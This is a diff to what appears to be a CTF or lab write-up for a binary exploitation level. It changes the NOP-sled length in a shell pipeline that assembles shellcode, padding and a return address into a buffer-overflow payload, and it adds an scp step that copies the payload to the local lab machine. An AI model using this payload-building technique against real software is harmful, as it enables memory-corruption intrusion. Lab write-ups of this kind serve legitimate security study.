@@ -186,9 +186,14 @@ Or single line
 ```
 {
   xxd -p shellcode.bin | tr -d '\n'
-  printf '90%.0s' {1..49}
+  printf '90%.0s' {1..57}
   echo -n '10e2ffffff7f0000'
 } | xxd -r -p > payload.bin
+```
+
+Copy the exploit
+```
+scp -P 4242 ./payload.bin level00@localhost:/home/level00
 ```
 
 Run the exploit
